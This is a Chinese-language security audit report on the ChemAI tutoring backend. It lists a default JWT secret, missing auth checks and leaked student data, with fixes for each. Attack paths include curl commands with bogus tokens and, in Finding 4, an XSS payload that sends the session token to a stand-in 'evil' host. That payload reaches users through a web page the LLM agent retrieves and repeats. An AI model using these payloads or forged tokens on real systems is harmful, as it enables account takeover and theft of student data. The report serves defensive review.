# ChemAI 安全审计报告（Security Posture Report）

- **审计日期**：2026-08-16
- **模式**：full daily（全量 Phase 0-14，8/10 置信度门禁）
- **审计范围**：`chemai-backend`（后端子模块，branch `master`）+ 前端静态资源
- **工具**：gstack `/cso` v2 + 手动代码追踪验证
- **分支上下文**：父仓库 `phase-7/ship`（验收分支）
- **安全评分**：**F（不合格）** —— 1 CRITICAL + 4 HIGH，未达发布门禁

---

## 一、执行摘要

| 项 | 数值 |
|---|---|
| 关键发现 | CRITICAL ×1、HIGH ×4、MEDIUM ×2、LOW ×2 |
| 依赖漏洞扫描 | **SKIPPED**（pip-audit 未安装） |
| 密钥考古 | 历史无硬编码密钥；`.env` 已 gitignore ✅ |
| 鉴权架构 | 三层鉴权（中间件→get_current_user→require_permission），**但有 2 处端点只靠中间件、绕过 Layer 2** |
| 密码存储 | bcrypt 12 rounds ✅ |
| SQL 注入 | 未发现（SQLAlchemy ORM）✅ |
| 命令注入 | 未发现（subprocess 用 exec 列表非 shell）✅ |

### 阻断性问题（必须清零）

| # | 严重度 | 置信 | 发现 |
|---|---|---|---|
| 1 | **CRITICAL** | 10/10 | JWT 密钥 = 硬编码默认值 `change-me-in-production` |
| 2 | **HIGH** | 9/10 | `/students/batch` 鉴权绕过（无 Layer 2） |
| 3 | **HIGH** | 10/10 | `data/chemai.db.bak` 被 git 跟踪且含真实数据 |
| 4 | **HIGH** | 8/10 | XSS：LaTeX 转义逃逸（`$...$` 内容未转义直接入 innerHTML） |
| 5 | **HIGH** | 9/10 | `/audit/equation` + `/audit/extract` 鉴权绕过（无 Layer 2） |
| 6 | MEDIUM | 9/10 | CORS `allow_origins=["*"]` + `allow_credentials=True` |
| 7 | MEDIUM | 8/10 | 无 lockfile + 依赖 `>=` 未锁定 |
| 8 | LOW | 8/10 | 登录无限流/无账号锁定 |
| 9 | LOW | 7/10 | refresh token 无轮换（7 天有效） |

---

## 二、攻击面地图

```
CODE SURFACE
  公开端点（无需认证）:   6   (/auth/login, /auth/apply, /auth/register/parent, /auth/refresh, /auth/activate, /health)
  受保护端点（Layer 2）:  ~140（大部分正确挂 Depends(get_current_user)/require_permission）
  鉴权绕过端点:          3   (/students/batch, /audit/equation, /audit/extract)
  文件上传点:             1   (OCR 上传，OCR_ALLOWED_EXTENSIONS/MIME 白名单已定义)
  外部集成:               4   (DashScope / DeepSeek / MiMo / 百度OCR / Zhipu)
  后台任务:               1   (APScheduler 调度器)
  WebSocket/SSE:          1   (Agent /chat/stream SSE)

INFRASTRUCTURE SURFACE
  CI/CD workflows:        0   （无 .github/workflows）
  Container configs:      0   （docker/ 目录存在但无 Dockerfile/compose）
  IaC configs:            0
  Secret management:      env vars（.env 已 gitignore，但 JWT_SECRET 用默认弱值）
```

---

## 三、关键发现（含攻击路径）

### Finding 1 — [CRITICAL] (10/10) JWT 密钥为硬编码默认值 — `app/config.py:68`

- **类别**：OWASP A02 加密失败 / Secrets
- **代码**：`JWT_SECRET = os.getenv("JWT_SECRET", "change-me-in-production")`；`.env` 实测 23 字符且以 `cha` 开头，确认使用了默认值。
- **攻击路径**：
  1. 攻击者（代码在 GitHub 公开）读取 `config.py` 得知默认密钥 `change-me-in-production`。
  2. 用该密钥本地签一个 HS256 JWT：`{"user_id": <任意 Account.id>, "role": "teacher"/"admin", "type": "access", "exp": <未来>}`。
  3. 携带该 token 访问任意受保护端点 → 以任意角色身份登录，读取/篡改学生成绩、家长信息、考试数据。
- **影响**：完全认证绕过 + 账号接管 + 垂直/水平越权。
- **修复**：
  ```bash
  openssl rand -hex 32   # 生成强密钥
  # 写入 .env: JWT_SECRET=<强密钥>，并轮换所有已签发 token
  ```
  同时在启动时检测默认值并拒绝启动：`if JWT_SECRET == "change-me-in-production": raise RuntimeError(...)`。

### Finding 2 — [HIGH] (9/10) `/api/v1/students/batch` 鉴权绕过 — `app/api/v1/auth.py:101`

- **类别**：OWASP A01 失效的访问控制
- **代码**：`@student_router.post("/batch")` 仅有 `db: AsyncSession = Depends(get_db)`，无 `Depends(get_current_user)`。
- **根因**：全局中间件（`app/main.py:54`）只检查 `Authorization` 头**存在性**（`startswith("Bearer ")`），不校验 token 有效性；真正的 JWT 校验在 Layer 2 `get_current_user`。此端点未挂 Layer 2。
- **攻击路径**：`curl -X POST /api/v1/students/batch -H "Authorization: Bearer garbage" -d '{"students":[...],"class_id":1,"school_id":1}'` → 未认证批量创建学生账号。
- **影响**：未认证的写操作（批量建号），可污染系统或作为后续攻击的跳板。
- **修复**：加 `user: UserContext = Depends(require_permission("student", "create"))`。

### Finding 3 — [HIGH] (10/10) `data/chemai.db.bak` 被 git 跟踪且含真实数据

- **类别**：Secrets / 敏感数据泄露
- **代码**：`git ls-files` 确认 `data/chemai.db.bak`（290KB）被跟踪；已推送到 GitHub（`zheng8859/chemai-backend`）。
- **实测数据**：`account=4`（含 bcrypt 哈希）、`student=2`（姓名/手机号）、`parent=1`、`teacher=1`、`question=25`、`warning_log=1`。
- **攻击路径**：克隆仓库 → 读取 `data/chemai.db.bak` → 得到学生/家长 PII、bcrypt 哈希（可离线爆破弱密码）、教师档案、预警日志。
- **影响**：学生隐私泄露 + 凭证哈希泄露；若仓库公开则任何人可见。
- **修复**：
  1. `git rm --cached data/chemai.db.bak` 并加入 `.gitignore`。
  2. `git filter-repo --path data/chemai.db.bak --invert-paths` 清洗历史（需 force-push）。
  3. 轮换所有曾在库里的账号密码。

### Finding 4 — [HIGH] (8/10) XSS：LaTeX 转义逃逸 — `frontend/js/agent-renderer.js:218`

- **类别**：OWASP A03 注入（XSS）
- **代码**：`_escapeLatex()` 先提取 `$...$`/`$$...$$` 块存入数组，转义其余文本后**原样还原** LaTeX 块——即 LaTeX 块内的内容不经过任何转义。
- **触发链**：
  1. `web_search` 工具（`agent-renderer.js:292` 映射到 `_renderChemistryTutor`）检索外部网页。
  2. 攻击者构造页面，内容形如 `$<img src=x onerror=fetch('https://evil/?c='+localStorage.getItem('chemai_token'))>$`。
  3. LLM 复述该「公式」→ `_escapeLatex` 原样还原 `<img onerror>` → `cardDiv.innerHTML = cardHtml`（`index.html:1129`）解析并执行。
- **影响**：XSS → 读取 localStorage 中的 `chemai_token` → 会话劫持 → 账号接管。token 存 localStorage 使此路径可被直接窃取。
- **修复**：LaTeX 块内容同样做 HTML 转义（只放行安全字符），或改为先经 KaTeX 渲染（`renderToString` 输出是安全的）再入 innerHTML，不要插入原始 LaTeX 源码。

### Finding 5 — [HIGH] (9/10) `/api/v1/audit/equation` + `/audit/extract` 鉴权绕过 — `app/api/v1/audit.py:53,83`

- **类别**：OWASP A01 失效的访问控制
- **代码**：`audit.py` 两个端点均无 `Depends(get_current_user)`（该文件 0 处鉴权依赖）。
- **根因**：同 Finding 2，中间件只查 Bearer 头存在性。
- **攻击路径**：`curl -X POST /api/v1/audit/equation -H "Authorization: Bearer x" -d '{"equation":"..."}'` → 未认证调用审核引擎。
- **影响**：未认证访问审核引擎（确定性纯函数，无敏感数据泄露），主要风险为越权调用 + CPU 资源滥用。
- **修复**：加 `user: UserContext = Depends(get_current_user)`。

### Finding 6 — [MEDIUM] (9/10) CORS 通配符 + 凭证 — `app/main.py:44-50`

- **代码**：`allow_origins=["*"]` 与 `allow_credentials=True` 并用。
- **影响**：任意源可发起带凭证的跨域请求。当前 token 存 localStorage（跨域 JS 读不到），实际风险被缓解；但属生产不应有的配置（代码注释亦自认「生产应收紧」）。
- **修复**：将 `allow_origins` 收窄到白名单源，`allow_credentials=True` 时禁止通配符。

### Finding 7 — [MEDIUM] (8/10) 依赖未锁定 + 无 lockfile — `requirements.txt`

- **代码**：全部依赖用 `>=` 未锁定（`fastapi>=0.109.2`、`langchain>=0.3.0` 等），无 lockfile（无 `poetry.lock`/`requirements.lock`）。
- **影响**：供应链风险，构建不可复现；`pip-audit` 未安装，CVE 扫描 SKIPPED。
- **修复**：`pip install pip-tools` 生成锁定文件；`pip install pip-audit && pip-audit` 跑 CVE 扫描。

### Finding 8 — [LOW] (8/10) 登录无限流/无账号锁定 — `app/api/v1/auth.py`

- **影响**：登录接口无速率限制、无失败次数追踪、无锁定；配合演示密码（`test123`）可被暴力破解。
- **修复**：加登录限流（如按 IP + phone 维度）、失败锁定策略。

### Finding 9 — [LOW] (7/10) refresh token 无轮换 — `app/core/security.py`

- **代码**：refresh token 7 天有效（`create_refresh_token`），未见 jti/轮换/撤销列表。
- **影响**：refresh token 一旦泄露，7 天内可反复换取 access token。
- **修复**：引入 jti + 每次 refresh 轮换 + 服务端撤销列表。

---

## 四、供应链摘要

| 项 | 值 |
|---|---|
| 直接依赖 | 25（requirements.txt） |
| 传递依赖 | 未解析（无 lockfile） |
| CVE 扫描 | **SKIPPED**（pip-audit 未安装，`pip install pip-audit && pip-audit`） |
| 锁定文件 | 缺失（HIGH→MEDIUM，已列 Finding 7） |
| 安装脚本风险 | N/A（Python，无 postinstall） |

---

## 五、已确认的安全实践（非问题）

- ✅ 密码用 **bcrypt 12 rounds**（`app/core/security.py:26-36`）
- ✅ 三层鉴权架构整体正确（中间件 → `get_current_user` → `require_permission` 权限矩阵）
- ✅ SQLAlchemy ORM，未发现 SQL 注入
- ✅ `subprocess` 用 `create_subprocess_exec` 列表参数（非 `shell=True`），未发现命令注入
- ✅ 前端多数路径用 `escapeHtml`/`_esc` 转义
- ✅ `.env` 已 gitignore（真实密钥未入库）
- ✅ git 历史未发现 AKIA/ghp_/sk-live 等硬编码密钥

---

## 六、修复路线图（按优先级）

1. **立即**（CRITICAL）：轮换 JWT 密钥，加默认值启动保护（Finding 1）。
2. **立即**（HIGH）：补 3 处鉴权依赖（Finding 2、5），并从 git 历史清除 `.db.bak`（Finding 3）。
3. **尽快**（HIGH）：修 LaTeX 转义逃逸（Finding 4）。
4. **发布前**（MEDIUM）：收窄 CORS（Finding 6）、锁定依赖 + 跑 pip-audit（Finding 7）。
5. **延后**（LOW）：登录限流（Finding 8）、refresh 轮换（Finding 9）。

---

## 七、结论

**安全审计不通过（F）**。存在 1 个 CRITICAL（JWT 弱密钥，可伪造任意角色 token）与 4 个 HIGH（2 处鉴权绕过 + 真实数据入库 + XSS 逃逸）。必须清零 CRITICAL 与 HIGH 后方可进入 `v1.0.0-rc.1` 打标流程。

---

> **免责声明**：本工具不替代专业安全审计。`/cso` 是 AI 辅助扫描，用于发现常见漏洞模式，不保证全面、不保证零漏报。LLM 可能漏掉细微漏洞、误解复杂认证流程。生产系统处理敏感数据、支付或 PII 时，应聘请专业渗透测试机构。请将 `/cso` 作为第一道筛查，而非唯一防线。
